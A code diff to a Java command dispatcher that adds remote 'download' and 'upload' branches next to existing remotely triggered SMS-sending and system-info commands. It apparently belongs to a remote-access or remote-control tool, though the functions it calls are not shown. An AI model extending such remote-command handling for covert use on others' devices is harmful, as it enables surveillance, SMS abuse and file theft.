@@ -30,7 +30,6 @@ public class DefaultDispatcher extends Dispatcher {
 
     @Override
     public BaneObject dispatch(BaneObject request) {
-        System.out.println(request);
         String command = ((String)request.values[0].value);
         if(command.contains("name")){
             String newName = ((String)request.values[0].value).replace("name ","");
@@ -65,7 +64,11 @@ public class DefaultDispatcher extends Dispatcher {
             return SMSSender.sendSMS(list.get(1),list.get(2).substring(1,list.get(2).length()-1));
         } else if(command.contains("sysinfo")){
             return SysInfo.sysinfo();
-        }else {
+        } else if(command.contains("download")){
+            return super.download(request);
+        } else if(command.contains("upload")){
+            return super.upload(request);
+        } else {
             return new BaneObject(BaneCode.ERROR,"Command not recognized",null);
         }
     }
